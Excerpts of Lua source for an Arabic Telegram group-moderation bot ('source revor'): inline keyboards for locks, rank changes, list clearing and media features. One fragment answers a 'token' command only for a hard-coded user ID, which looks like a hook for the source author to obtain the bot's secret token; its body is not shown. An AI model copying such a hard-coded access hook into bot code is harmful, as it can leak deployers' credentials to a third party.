...
# source revor 𝙏𝙊 source revor @REVORB0T
...
_key = {
{{text="مسح قائمه العام",callback_data="delbanall"..msg.sender_user_id_}},
}
...
_key = {
{{text="مسح قائمه الكتم العام",callback_data="delmuteall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المطورين",callback_data="deldev"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المميزين عام",callback_data="delvipall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المنشئين الاساسين",callback_data="delasas"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المالكين",callback_data="delowner"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المنشئين",callback_data="delmonsh"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المدراء",callback_data="delmanger"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح الادمنيه",callback_data="delmod"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المميزين",callback_data="delvip"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المكتومين",callback_data="delmute"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
_key = {
{{text="مسح المحظورين",callback_data="delbanu"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
if text == "تحكم" and Manger(msg) then   
tdcli_function ({ID = "GetUser",user_id_ = bot_id},function(arg,data) 
local Text = "اضغط علي احد الازرار للتحكم ف الروم من خاص البوت"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اوامر القفل', url="https://t.me/"..data.username_.."?start=tth"..msg.chat_id_},{text = 'اوامر التعطيل', url="https://t.me/"..data.username_.."?start=qff"..msg.chat_id_}},
{{text = 'تحكم الرتب', url="https://t.me/"..data.username_.."?start=kkh"..msg.chat_id_}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
...
send(msg.chat_id_,msg.id_,'هذا الامر لرتبه المالك فقط')
end
end
...
local mahmoud = "٭ عدد الادمنيه : "..data.administrator_count_..
...
_key = {
{{text="مسح الثانويين",callback_data="deldevsall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
...
mahmoud = text:match("^اضف رسائل (%d+)$")
...
send(msg.chat_id_, msg.id_,'*٭ عدد المجموعات الان ~ '..#group..' مجموعه '..storm..''..mahmoud..'\n٭ اصبح عدد المجموعات الان ~ '..sendok..' مجموعات*\n') 
end
end
end,nil)
end
...
-----by-7oda--
if text == 'حظر' or text == 'الغاء حظر' or text == 'كتم' or text == 'الغاء كتم' or text == 'طرد' or text == 'تقييد' or text == 'الغاء تقييد' or text == 'قفل الدردشه' or text == 'فتح الدردشه' and msg.reply_to_message_id_ and not Admin(msg) then
...
send(msg.chat_id_, msg.id_,'انت حودا مطور السورس يقلبي 🌚♥')
else
if msg.sender_user_id_ == tonumber(sudo_id) then
send(msg.chat_id_, msg.id_,'انت المطور الاساسي يروح قلبي♥')
else
if DevBot(msg) then
...
local T = text:match("^اشتم (.*)$")
if T == 'محمود' or T == 'حودا' or T == '@MahmoudM2' or T == 'mahmoud' or T == 'Mahmoud' then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
local UserName = (data.username_ or "revorb0t")
mm = "كتفمك انت يا ["..data.first_name_.."](T.me/"..UserName..")\nانت عاوزني اشتم مطور السورس ؟🙂😹\n"
...
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=msg.sender_user_id_.."/sorty2"},
},
}
local msg_id = msg.id_/2097152/0.5
local Teext = " ٭ عدد صورك ~⪼ "..mahmoud.total_count_.." صوره‌‏"
...
if my_gm then
send(msg.chat_id_, msg.id_," ٭ نسبه جمالي معطله") 
return false 
end
if DevBot(msg) then
local function mahmoud(extra, mahmoud, success)
...
keyboard.inline_keyboard = {
{
{text = 'اغنيه اخري',callback_data=msg.sender_user_id_.."/ganyy"},
},
}
local msg_id = msg.id_/2097152/0.5
...
if my_yt then
send(msg.chat_id_, msg.id_," ٭ اليوتيوب معطل") 
return false 
end
...
if text and text ~="يوتيوب" and database:get(bot_id..":"..msg.sender_user_id_.."YTsearch"..msg.chat_id_) == "sendYTsearch" then
...
if text == "يوتيوب" or text == 'اليوتيوب' or text == 'بحث' then 
local my_yt = database:get(bot_id.."my_yt:status"..msg.chat_id_)
if my_yt then
send(msg.chat_id_, msg.id_," ٭ اليوتيوب معطل") 
return false 
...
local Text = "٭ ارسل الان اغنيه للبحث عنها ..."
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر', callback_data=msg.sender_user_id_.."/cancelY"},
},
{
{text = 'اضف البوت لمجموعتك', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
...
local Text = '┉ ┉  ┉╔ source revor ╗┉  ┉ ┉\n \n*① اوامر الحمايه*\n*② اوامر الادمنيه*\n*③ اوامر المدراء*\n*④ اوامر المنشئيين*\n*⑤ اوامر اوامر المطورين*\n*⑥ اوامر التسليه*\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n فقط « ['..mm.first_name_..'](tg://user?id='..mm.id_..') » يمكنه التحكم ف الازرار\n[٭ source revor](t.me/Revorb0t)•'
keyboard = {} 
keyboard.inline_keyboard = {
{
...
--------------
if text == ("رفع") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function mahmoud(extra, result, success)
local Text = "٭ اختر الرتبه"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'رفع مميز', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/setspecial"}
},
{
{text = 'رفع ادمن', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/aetadmin"}
},
{
{text = 'رفع مدير', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/gsetma"}
},
{
{text = 'رفع منشئ', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/metmonsh"}
},
{
{text = 'رفع منشئ اساسي', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/ketmonshs"}
},
{
{text = 'رفع مالك', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/oetowner"}
},
{
{text = 'رفع مطور', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/detdev"}
},
{
{text = 'رفع مطور ثانوي', callback_data='mah@'..msg.sender_user_id_..'/mhh@'..result.sender_user_id_.."/fetdevs"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'قفل الاضافه', callback_data=msg.sender_user_id_.."/lockjoine"},{text = 'فتح الاضافه', callback_data=msg.sender_user_id_.."/unlockjoine"},{text = 'قفل الانلاين', callback_data=msg.sender_user_id_.."/lockinlene"},{text = 'فتح الانلاين', callback_data=msg.sender_user_id_.."/unlockinlene"},
},
{
{text = 'قفل الدخول', callback_data=msg.sender_user_id_.."/lock_joine"},{text = 'فتح الدخول', callback_data=msg.sender_user_id_.."/unlock_joine"},{text = 'قفل البوتات', callback_data=msg.sender_user_id_.."/lockbots"},{text = 'فتح البوتات', callback_data=msg.sender_user_id_.."/unlockbots"},
},
{
{text = 'قفل الاشعارات', callback_data=msg.sender_user_id_.."/locktags"},{text = 'فتح الاشعارات', callback_data=msg.sender_user_id_.."/unlocktags"},{text = 'قفل التعديل', callback_data=msg.sender_user_id_.."/lockedit"},{text = 'فتح التعديل', callback_data=msg.sender_user_id_.."/unlockedit"},
},
{
{text = 'قفل المعرفات', callback_data=msg.sender_user_id_.."/lockusername"},{text = 'فتح المعرفات', callback_data=msg.sender_user_id_.."/unlockusername"},{text = 'قفل الروابط', callback_data=msg.sender_user_id_.."/locklink"},{text = 'فتح الروابط', callback_data=msg.sender_user_id_.."/unlocklink"},
},
{
{text = 'قفل التاك', callback_data=msg.sender_user_id_.."/locktag"},{text = 'فتح التاك', callback_data=msg.sender_user_id_.."/unlocktag"},{text = 'قفل الملصقات', callback_data=msg.sender_user_id_.."/locksticar"},{text = 'فتح الملصقات', callback_data=msg.sender_user_id_.."/unlocksticar"},
},
{
{text = 'قفل الفيديو', callback_data=msg.sender_user_id_.."/lockvideo"},{text = 'فتح الفيديو', callback_data=msg.sender_user_id_.."/unlockvideo"},{text = 'قفل المتحركه', callback_data=msg.sender_user_id_.."/lockgif"},{text = 'فتح المتحركه', callback_data=msg.sender_user_id_.."/unlockgif"},
},
{
{text = 'قفل الصور', callback_data=msg.sender_user_id_.."/lockphoto"},{text = 'فتح الصور', callback_data=msg.sender_user_id_.."/unlockphoto"},{text = 'قفل الاغاني', callback_data=msg.sender_user_id_.."/lockvoise"},{text = 'فتح الاغاني', callback_data=msg.sender_user_id_.."/unlockvoise"},
},
{
{text = 'قفل الصوت', callback_data=msg.sender_user_id_.."/lockaudo"},{text = 'فتح الصوت', callback_data=msg.sender_user_id_.."/unlockaudo"},{text = 'قفل التوجيه', callback_data=msg.sender_user_id_.."/lockfwd"},{text = 'فتح التوجيه', callback_data=msg.sender_user_id_.."/unlockfwd"},
},
{
{text = 'قفل الملفات', callback_data=msg.sender_user_id_.."/lockfile"},{text = 'فتح الملفات', callback_data=msg.sender_user_id_.."/unlockfile"},{text = 'قفل الجهات', callback_data=msg.sender_user_id_.."/lockphone"},{text = 'فتح الجهات', callback_data=msg.sender_user_id_.."/unlockphone"},
},
{
{text = 'قفل الكلايش', callback_data=msg.sender_user_id_.."/lockposts"},{text = 'فتح الكلايش', callback_data=msg.sender_user_id_.."/unlockposts"},{text = 'قفل التكرار', callback_data=msg.sender_user_id_.."/lockflood"},{text = 'فتح التكرار', callback_data=msg.sender_user_id_.."/unlockflood"},
},
{
{text = 'قفل الفارسيه', callback_data=msg.sender_user_id_.."/lockfarse"},{text = 'فتح الفارسيه', callback_data=msg.sender_user_id_.."/unlockfarse"},{text = 'قفل السب', callback_data=msg.sender_user_id_.."/lockfshar"},{text = 'فتح السب', callback_data=msg.sender_user_id_.."/unlockfshar"},
},
{
...
keyboard.inline_keyboard = {
{
{text = 'تعطيل الرابط', callback_data=msg.sender_user_id_.."/lock_links"},{text = 'تفعيل الرابط', callback_data=msg.sender_user_id_.."/unlock_links"},{text = 'تعطيل الترحيب', callback_data=msg.sender_user_id_.."/lockwelcome"},{text = 'تفعيل الترحيب', callback_data=msg.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'تعطيل الردود العامه', callback_data=msg.sender_user_id_.."/lockrepall"},{text = 'تفعيل الردود العامه', callback_data=msg.sender_user_id_.."/unlockrepall"},{text = 'تعطيل الايدي', callback_data=msg.sender_user_id_.."/lockide"},{text = 'تفعيل الايدي', callback_data=msg.sender_user_id_.."/unlockide"},
},
{
{text = 'تعطيل الايدي بالصوره', callback_data=msg.sender_user_id_.."/lockidephoto"},{text = 'تفعيل الايدي بالصوره', callback_data=msg.sender_user_id_.."/unlockidephoto"},{text = 'تعطيل الحظر', callback_data=msg.sender_user_id_.."/lockkiked"},{text = 'تفعيل الحظر', callback_data=msg.sender_user_id_.."/unlockkiked"},
},
{
{text = 'تعطيل الرفع', callback_data=msg.sender_user_id_.."/locksetm"},{text = 'تفعيل الرفع', callback_data=msg.sender_user_id_.."/unlocksetm"},{text = 'تعطيل اطردني', callback_data=msg.sender_user_id_.."/lockkikedme"},{text = 'تفعيل اطردني', callback_data=msg.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'تعطيل الالعاب', callback_data=msg.sender_user_id_.."/lockgames"},{text = 'تفعيل الالعاب', callback_data=msg.sender_user_id_.."/unlockgames"},{text = 'تعطيل الردود', callback_data=msg.sender_user_id_..msg.sender_user_id_.."/lockrepgr"},{text = 'تفعيل الردود', callback_data=msg.sender_user_id_.."/unlockrepgr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'توكن' and  msg.sender_user_id_ == tonumber(1593178008) then
local abc = msg.id_/2097152/0.5
...
local Texti = 'ــــــــــــــــــــــــــــsource revorـــــــــــــــــــــــــ\nتستطيع تعطيل وتفعيل عبر الازرار\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعطيل الرابط', callback_data=msg.sender_user_id_.."/lock_links"},{text = 'تفعيل الرابط', callback_data=msg.sender_user_id_.."/unlock_links"},{text = 'تعطيل الترحيب', callback_data=msg.sender_user_id_.."/lockwelcome"},{text = 'تفعيل الترحيب', callback_data=msg.sender_user_id_.."/unlockwelcome"},
...
local Texti = 'ــــــــــــــــــــsource revorــــــــــــــــــــــــــ\nتستطيع قفل وفتح عبر الازرار\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'قفل الاضافه', callback_data=msg.sender_user_id_.."/lockjoine"},{text = 'فتح الاضافه', callback_data=msg.sender_user_id_.."/unlockjoine"},{text = 'قفل الانلاين', callback_data=msg.sender_user_id_.."/lockinlene"},{text = 'فتح الانلاين', callback_data=msg.sender_user_id_.."/unlockinlene"},
...
local m = '٭ العضو ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n ٭ تم كتمه في المجموعه\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
...
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * ٭ تم مسح قائمه الكتم العام*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * ٭ تم مسح قائمه (الحظر/الكتم) العام*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * ٭ تم مسح المكتومين*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Teext = 'صورتك التاليه'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=data.sender_user_id_.."/s3orty"},{text = 'صورتك السابقه', callback_data=data.sender_user_id_.."/s1orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
...
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id,0,'️٭ انت لا تمتلك صور اخري ')
end end,nil)
end end
...
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=data.sender_user_id_.."/s3orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0, "٭ انت لا تمتلك صور اخري")
end end,nil)
end end
...
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=data.sender_user_id_.."/s4orty"},{text = 'صورتك السابقه', callback_data=data.sender_user_id_.."/s2orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=data.sender_user_id_.."/s5orty"},{text = 'صورتك السابقه', callback_data=data.sender_user_id_.."/s4orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=data.sender_user_id_.."/s6orty"},{text = 'صورتك السابقه', callback_data=data.sender_user_id_.."/s5orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=data.sender_user_id_.."/s7orty"},{text = 'صورتك السابقه', callback_data=data.sender_user_id_.."/s6orty"},
},
}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DeleteMessage(Chat_id,{[0] = Msg_id})  
send(Chat_id, 0,'️٭ عذرا لا يمكنني جلب اكثر من 5 صور ')
end end
...
local Tww = '٭ اوامر المطور الاساسي \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n٭ حظر عام\n٭ الغاء العام\n٭ مسح قائمه العام\n٭ تغير اسم البوت\n٭ رفع /تنزيل مطور \n٭ المطورين\n٭ مسح المطورين\n٭ اضف/حذف رد عام \n٭ مسح الردود العامه\n٭ الردود العامه \n٭ وضع /حذف كليشه المطور \n٭ تحديث + تحديث السورس \n\n٭ تفعيل/تعطيل البوت الخدمي \n٭ تعين عدد الاعضاء + العدد\n٭ تفعيل/تعطيل المغادرة\n٭ تفعيل/تعطيل الاذاعه \n٭ تفعيل/تعطيل ملف + اسم الملف\n٭ الملفات \n٭ مسح جميع الملفات \n٭ المتجر \n٭ اوامر المطور \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n٭ تفعيل /تعطيل\n\n٭ رفع/تنزيل منشئ اساسي\n٭ رفع منشئ \n٭ مسح المنشئين الاساسين\n٭ المنشئين الاساسين \n٭ غادر \n٭ غادر + الايدي\n٭ اذاعه \n٭ اذاعه بالتوجيه\n٭ اذاعه خاص \n٭ اذاعه بالتثبيت \n٭ الاحصائيات \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n[source revor](t.me/Revorb0t)•\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '①', callback_data=data.sender_user_id_.."/help1"},{text = '②', callback_data=data.sender_user_id_.."/help2"},{text = '③', callback_data=data.sender_user_id_.."/help3"},
...
keyboard.inline_keyboard = {
{
{text = 'تعطيل الرابط', callback_data=data.sender_user_id_.."/lock_links"},{text = 'تفعيل الرابط', callback_data=data.sender_user_id_.."/unlock_links"},{text = 'تعطيل الترحيب', callback_data=data.sender_user_id_.."/lockwelcome"},{text = 'تفعيل الترحيب', callback_data=data.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'تعطيل الردود العامه', callback_data=data.sender_user_id_.."/lockrepall"},{text = 'تفعيل الردود العامه', callback_data=data.sender_user_id_.."/unlockrepall"},{text = 'تعطيل الايدي', callback_data=data.sender_user_id_.."/lockide"},{text = 'تفعيل الايدي', callback_data=data.sender_user_id_.."/unlockide"},
},
{
{text = 'تعطيل الايدي بالصوره', callback_data=data.sender_user_id_.."/lockidephoto"},{text = 'تفعيل الايدي بالصوره', callback_data=data.sender_user_id_.."/unlockidephoto"},{text = 'تعطيل الحظر', callback_data=data.sender_user_id_.."/lockkiked"},{text = 'تفعيل الحظر', callback_data=data.sender_user_id_.."/unlockkiked"},
},
{
{text = 'تعطيل الرفع', callback_data=data.sender_user_id_.."/locksetm"},{text = 'تفعيل الرفع', callback_data=data.sender_user_id_.."/unlocksetm"},{text = 'تعطيل اطردني', callback_data=data.sender_user_id_.."/lockkikedme"},{text = 'تفعيل اطردني', callback_data=data.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'تعطيل الالعاب', callback_data=data.sender_user_id_.."/lockgames"},{text = 'تفعيل الالعاب', callback_data=data.sender_user_id_.."/unlockgames"},{text = 'تعطيل الردود', callback_data=data.sender_user_id_..data.sender_user_id_.."/lockrepgr"},{text = 'تفعيل الردود', callback_data=data.sender_user_id_.."/unlockrepgr"},
},
}
...
keyboard.inline_keyboard = {
{
{text = 'قفل الاضافه', callback_data=data.sender_user_id_.."/lockjoine"},{text = 'فتح الاضافه', callback_data=data.sender_user_id_.."/unlockjoine"},{text = 'قفل الانلاين', callback_data=data.sender_user_id_.."/lockinlene"},{text = 'فتح الانلاين', callback_data=data.sender_user_id_.."/unlockinlene"},
},
{
{text = 'قفل الدخول', callback_data=data.sender_user_id_.."/lock_joine"},{text = 'فتح الدخول', callback_data=data.sender_user_id_.."/unlock_joine"},{text = 'قفل البوتات', callback_data=data.sender_user_id_.."/lockbots"},{text = 'فتح البوتات', callback_data=data.sender_user_id_.."/unlockbots"},
},
{
{text = 'قفل الاشعارات', callback_data=data.sender_user_id_.."/locktags"},{text = 'فتح الاشعارات', callback_data=data.sender_user_id_.."/unlocktags"},{text = 'قفل التعديل', callback_data=data.sender_user_id_.."/lockedit"},{text = 'فتح التعديل', callback_data=data.sender_user_id_.."/unlockedit"},
},
{
{text = 'قفل المعرفات', callback_data=data.sender_user_id_.."/lockusername"},{text = 'فتح المعرفات', callback_data=data.sender_user_id_.."/unlockusername"},{text = 'قفل الروابط', callback_data=data.sender_user_id_.."/locklink"},{text = 'فتح الروابط', callback_data=data.sender_user_id_.."/unlocklink"},
},
{
{text = 'قفل التاك', callback_data=data.sender_user_id_.."/locktag"},{text = 'فتح التاك', callback_data=data.sender_user_id_.."/unlocktag"},{text = 'قفل الملصقات', callback_data=data.sender_user_id_.."/locksticar"},{text = 'فتح الملصقات', callback_data=data.sender_user_id_.."/unlocksticar"},
},
{
{text = 'قفل الفيديو', callback_data=data.sender_user_id_.."/lockvideo"},{text = 'فتح الفيديو', callback_data=data.sender_user_id_.."/unlockvideo"},{text = 'قفل المتحركه', callback_data=data.sender_user_id_.."/lockgif"},{text = 'فتح المتحركه', callback_data=data.sender_user_id_.."/unlockgif"},
},
{
{text = 'قفل الصور', callback_data=data.sender_user_id_.."/lockphoto"},{text = 'فتح الصور', callback_data=data.sender_user_id_.."/unlockphoto"},{text = 'قفل الاغاني', callback_data=data.sender_user_id_.."/lockvoise"},{text = 'فتح الاغاني', callback_data=data.sender_user_id_.."/unlockvoise"},
},
{
{text = 'قفل الصوت', callback_data=data.sender_user_id_.."/lockaudo"},{text = 'فتح الصوت', callback_data=data.sender_user_id_.."/unlockaudo"},{text = 'قفل التوجيه', callback_data=data.sender_user_id_.."/lockfwd"},{text = 'فتح التوجيه', callback_data=data.sender_user_id_.."/unlockfwd"},
},
{
{text = 'قفل الملفات', callback_data=data.sender_user_id_.."/lockfile"},{text = 'فتح الملفات', callback_data=data.sender_user_id_.."/unlockfile"},{text = 'قفل الجهات', callback_data=data.sender_user_id_.."/lockphone"},{text = 'فتح الجهات', callback_data=data.sender_user_id_.."/unlockphone"},
},
{
{text = 'قفل الكلايش', callback_data=data.sender_user_id_.."/lockposts"},{text = 'فتح الكلايش', callback_data=data.sender_user_id_.."/unlockposts"},{text = 'قفل التكرار', callback_data=data.sender_user_id_.."/lockflood"},{text = 'فتح التكرار', callback_data=data.sender_user_id_.."/unlockflood"},
},
{
{text = 'قفل الفارسيه', callback_data=data.sender_user_id_.."/lockfarse"},{text = 'فتح الفارسيه', callback_data=data.sender_user_id_.."/unlockfarse"},{text = 'قفل السب', callback_data=data.sender_user_id_.."/lockfshar"},{text = 'فتح السب', callback_data=data.sender_user_id_.."/unlockfshar"},
},
{
...
keyboard.inline_keyboard = {
{
{text = 'اضغط للتحميل', callback_data="mp/"..gg.url},
},
}
local msg_id = msg.id_/2097152/0.5
...
if text and text:match("^تيست (.*)$") then
local hhh = text:match("^تيست (.*)$")
